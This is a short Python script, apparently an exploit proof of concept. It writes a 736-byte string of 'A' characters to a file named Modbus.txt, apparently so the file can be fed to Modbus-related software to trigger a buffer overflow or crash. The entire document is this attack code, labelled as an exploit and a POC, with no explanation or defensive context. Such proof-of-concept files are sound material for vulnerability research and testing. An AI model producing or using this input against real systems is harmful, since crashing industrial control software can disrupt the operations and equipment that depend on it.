#!/usr/bin/python
exploit = 'A' * 736
try:
    file = open("Modbus.txt","w")
    file.write(exploit)
    file.close()
    print("POC is created")
except:
    print("POC not created")